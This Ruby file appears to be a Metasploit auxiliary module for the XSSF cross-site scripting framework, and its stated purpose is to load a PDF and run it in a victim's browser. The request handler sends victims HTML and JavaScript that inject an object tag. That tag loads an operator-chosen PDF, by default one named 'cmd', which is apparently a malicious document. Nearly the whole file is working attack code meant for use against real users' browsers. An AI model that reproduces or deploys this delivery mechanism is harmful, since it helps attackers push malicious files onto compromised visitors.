require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'PDF loader',
			'Description' => 'Loads a PDF and runs it on victims browser'
		))
		
		# Options can be added to the module
		register_options(
			[
				OptString.new('PDFName', [false, "Name of the PDF to load (without .pdf, included in '#{Msf::Xssf::INCLUDED_FILES}').", 'cmd'])
			], self.class
		)
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			<html><body><script>
			elt = document.createElement('div');
			elt.innerHTML = "<object width='500' height='650' data='resources/#{datastore['PDFName']}.pdf' type='application/pdf' ></object>";
			document.body.appendChild(elt);
			</script></body></html>
		}
		
		send_response(cli, code)
	end
end